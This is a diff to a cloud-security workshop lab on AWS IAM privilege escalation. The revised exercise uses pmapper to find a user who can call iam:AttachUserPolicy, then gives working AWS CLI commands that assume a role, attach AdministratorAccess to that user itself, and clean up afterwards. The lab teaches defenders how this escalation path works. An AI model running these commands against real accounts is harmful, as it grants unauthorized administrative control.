@@ -82,45 +82,77 @@ pmapper analyzes IAM relationships and finds privilege escalation paths.
 
 ---
 
-## Exercise 2: Investigate Privilege Escalation Paths
+## Exercise 2: Scenario 1 - AttachUserPolicy (Self-Escalation)
 
-In this exercise, you'll investigate each privilege escalation path found by pmapper. For each path, you'll:
-1. Use pmapper to query the specific finding
-2. Navigate to pathfinding.cloud to understand the attack in depth
-3. Review the attack details and remediation strategies
+The `iamws-dev-self-service-user` can attach any IAM policy to any user, including themselves.
 
----
+### Part A: Identify with pmapper
 
-### Path 1: AttachUserPolicy (Self-Escalation)
-
-**pmapper Investigation:**
-
-Query the specific user to confirm their escalation capability:
+Query the user's escalation capability:
 
 ```bash
-pmapper query "can privesc7-AttachUserPolicy do iam:AttachUserPolicy with *"
+pmapper query "who can do iam:AttachUserPolicy with *"
 ```
 
-This confirms the user can attach policies to themselves—a classic self-escalation vulnerability.
+Look for this line in the output:
+```
+user/iamws-dev-self-service-user IS authorized to call action iam:AttachUserPolicy for resource *
+```
 
-**pathfinding.cloud Investigation:**
+### Part B: Understand via pathfinding.cloud
 
-1. Open [pathfinding.cloud](https://pathfinding.cloud) in your browser
+1. Navigate to [pathfinding.cloud IAM-007](https://pathfinding.cloud/paths/iam-007)
+2. Review the **Attack Steps** section
 
-2. Browse the **Categories** section on the left sidebar:
-   - Self-Escalation
-   - Principal Access
-   - New PassRole
-   - Existing PassRole
-   - Credential Access
+### Part C: Exploit
 
-3. Navigate to **Self-Escalation** → **[IAM-007: iam:AttachUserPolicy](https://pathfinding.cloud/paths/iam-007)**
+Attach AdministratorAccess to the vulnerable user:
 
-4. Review the path details:
-   - **Description** — What the attack does
-   - **Required Permissions** — What permissions enable it
-   - **Attack Steps** — How an attacker would execute it
-   - **Remediation** — How to fix it (you'll implement this in Lab 2!)
+```bash
+# Get credentials for the vulnerable user
+export $(printf "AWS_ACCESS_KEY_ID=%s AWS_SECRET_ACCESS_KEY=%s AWS_SESSION_TOKEN=%s" \
+  $(aws sts assume-role \
+    --role-arn arn:aws:iam::$(aws sts get-caller-identity --query Account --output text):role/iamws-dev-self-service-role \
+    --role-session-name exploit \
+    --query "Credentials.[AccessKeyId,SecretAccessKey,SessionToken]" \
+    --output text))
+
+# Verify identity
+aws sts get-caller-identity
+
+# Attach AdministratorAccess to self
+aws iam attach-user-policy \
+  --user-name iamws-dev-self-service-user \
+  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# Verify the policy was attached
+aws iam list-attached-user-policies --user-name iamws-dev-self-service-user
+```
+
+Expected output:
+```json
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "AdministratorAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+        }
+    ]
+}
+```
+
+### Cleanup
+
+Remove the attached policy before continuing:
+
+```bash
+aws iam detach-user-policy \
+  --user-name iamws-dev-self-service-user \
+  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# Reset credentials
+unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+```
 
 ---
 
